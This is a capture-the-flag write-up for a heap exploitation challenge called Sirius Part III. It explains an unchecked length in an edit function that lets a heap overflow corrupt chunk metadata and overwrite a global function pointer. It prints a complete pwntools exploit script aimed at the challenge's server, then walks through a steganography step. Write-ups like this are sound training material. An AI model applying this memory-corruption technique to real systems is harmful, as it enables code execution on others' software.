# SIRIUS – PART III CTF Writeup



![K3QC5HKUYNGPBM2EIMEC6SLC6SHSWGFV](https://github.com/user-attachments/assets/26f599e2-dcef-4c0c-8d9a-8cf2615e05b4)


## Challenge Overview

This challenge is a heap exploitation / use-after-free / heap metadata corruption challenge with a twist:
the goal is to overwrite a global function pointer (victim) on the BSS by corrupting a chunk_t metadata structure stored on the heap.




<img width="618" height="379" alt="image" src="https://github.com/user-attachments/assets/420ab32c-f3cd-4e88-9a4a-7da4b9e4b416" />




## Vulnerability


Out-of-bounds write (heap overflow) — do_edit() asks for a byte count n and then calls read_all(STDIN_FILENO, c->data, n) without checking n against c->size. That allows writing arbitrary bytes beyond the allocated c->data buffer on the heap, corrupting adjacent heap memory.

Persistent metadata in linear array — table[] stores pointers to metadata (chunk_t *) that remain allocated for the lifetime of the process. The program does not free or clear table[idx] when do_free() is called; do_free() only frees c->data but leaves the chunk_t structure (the metadata) in place and still pointed to by table[idx]. This makes it possible to corrupt the metadata and later use it.

Writable function pointer in data section — the binary has a global function pointer void (*victim)(void) = NULL; that the exploit targets. If the attacker can write an address into that location, the program will call it from invoke_ritual() (with minimal checks), enabling code flow to print_flag().

Lack of mitigations / fixed addresses used — the provided solver uses hardcoded addresses (PRINT_FLAG and the address of the victim pointer). In a real remote, either ASLR is disabled or these addresses can be discovered (e.g., via symbol info in the distributed binary or a prior leak).



| Vulnerability                    | Why it's exploitable                               |
| -------------------------------- | -------------------------------------------------- |
| **Heap overflow in `do_edit()`** | Write up to 0x2000 bytes into an undersized buffer |
| **Use-After-Free of `data`**     | Data pointer remains in use after free             |
| **No pointer nulling**           | Allows reusing freed memory unpredictably          |
| **Function pointer overwrite**   | `victim` is globally available and called          |
| **`puts(data)` info leak**       | Allows leaking contents of arbitrary memory        |
| **No double-free protection**    | Allows tcache poisoning                            |




## Exploit Strat

Use a chunk we control to overflow into an adjacent chunk_t metadata structure.

Overwrite the adjacent chunk_t’s data pointer to point at the global victim function-pointer variable address.

Use the program’s edit functionality on that adjacent entry to write the print_flag function address into victim.

Call the “Invoke ritual” menu option — the program will call victim() (now print_flag), printing the flag.





and for the variable addresses we can use this trick

<img width="485" height="59" alt="image" src="https://github.com/user-attachments/assets/d6ca058f-2c65-44f5-9ddb-90ad84e6c7ae" />




and then we build our python script


Python Script For The Exploit

```

#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

# Hardcoded addresses (from nm ./sirius3)
PRINT_FLAG = 0x401206
VICTIM = 0x404160

log.success(f"print_flag @ {hex(PRINT_FLAG)}")
log.success(f"victim @ {hex(VICTIM)}")

# Connect to remote server
p = remote('72.146.224.45', 6060)

# Helper functions
def alloc(size):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'size (decimal): ', str(size).encode())

def edit(idx, length, data):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'bytes to write (decimal): ', str(length).encode())
    p.recvuntil(b'Enter data')
    p.send(data)

def invoke():
    p.sendlineafter(b'Choice: ', b'6')

# ========== EXPLOIT ==========
log.info("=== Starting Exploit ===")

# Allocate chunk 0
log.info("Step 1: Allocating chunk...")
alloc(0x40)

# Build overflow payload
log.info("Step 2: Building overflow payload...")
payload = b'A' * 0x40      # Fill data0 buffer
payload += p64(0)          # malloc prev_size
payload += p64(0x41)       # malloc size
payload += p64(0x40)       # chunk_t->size
payload += p64(VICTIM)     # chunk_t->data = &victim
payload += b'X' * 32       # chunk_t->name
payload += p32(1)          # chunk_t->in_use

# Send overflow
log.info("Step 3: Overflowing...")
edit(0, len(payload), payload)

# Write print_flag to victim
log.info("Step 4: Writing print_flag to victim...")
edit(0, 8, p64(PRINT_FLAG))

# Trigger win
log.info("Step 5: Invoking ritual!")
invoke()

p.interactive()


```


1- alloc(0x40) — allocate a chunk (first free slot after the initial two entries, usually index 2). This gives us another chunk but the exploit uses the existing init chunk at index 0 as the overflow source.

2- Build the overflow payload described above. Important offset choices:

b'A' * 0x40 overflows more than the init->data (which is 0x30 in the binary). The extra bytes write into the contiguous heap region where the next chunk_t metadata (“control”) resides.

At the exact offset for the data field of the control chunk_t, they store p64(VICTIM) — i.e., the address of the victim pointer variable.

3- edit(0, len(payload), payload) — write the big payload into init->data (index 0). The unchecked write thus corrupts the next chunk’s metadata (control), overwriting control->data so that the program believes that the control chunk’s data pointer points at &victim.

4- edit(0, 8, p64(PRINT_FLAG)) — this next write in the solver writes 8 bytes (the address of print_flag) into the corrupted control->data location. Practically, the exploit uses the program’s edit function on the chunk whose metadata we corrupted — so the read_all() call will ultimately write to the location pointed to by that chunk’s data pointer. In the solver this ends up writing PRINT_FLAG into the victim global pointer.

(Implementation note: depending on the exact heap packing produced by the libc allocator / binary, the script indexes used for the second edit can differ; the solver demonstrates a working sequence for the deployed binary.)

5- invoke() — call “Invoke ritual”. invoke_ritual() checks if (victim == print_flag) first; but because victim now points to print_flag, it triggers the sirius_poem() + print_flag() flow. The print_flag() reads and prints flag.txt.

6- p.interactive() — keep the session open to see the flag or interact further.



<img width="719" height="740" alt="image" src="https://github.com/user-attachments/assets/3a2d28e8-21fa-46ed-b85f-f2c1e8d0ecad" />




open the drive link
```
[The Final Fragment Descends]
https://drive.google.com/file/d/17WvFA-O5XpopuW9DCyXS7DTyg1wh27px/view?usp=sharing
```




and you'll get the "flag" which is an image

![rosalina](https://github.com/user-attachments/assets/18751aa7-7a26-4a76-ad25-109f4f46b084)

Now The Fun Part


open the image's metadata in a metadata viewer


you'll see a suspicious comment that's not supposed to be there


<img width="1029" height="631" alt="image" src="https://github.com/user-attachments/assets/98cff776-9851-4e06-b36a-c9aa29838e52" />


if you haven't realised that it's base64 yet, paste it into a hash identifier


<img width="970" height="158" alt="image" src="https://github.com/user-attachments/assets/092d4bea-9554-4ecd-b6b7-600b0517f2f6" />


now decode it


<img width="1146" height="752" alt="image" src="https://github.com/user-attachments/assets/bc8d1187-c93f-4f9a-bb00-81d47a3e6bf2" />


you'll see a steghide comment, you can use steghide or any steganographic decoder to decode it


<img width="1203" height="400" alt="image" src="https://github.com/user-attachments/assets/648f40e7-2f98-4440-8d94-28e648ae1565" />


decode it and congrats you found the sirius


<img width="388" height="158" alt="image" src="https://github.com/user-attachments/assets/921115b0-4ede-47cc-aec4-b0974d0aba7a" />

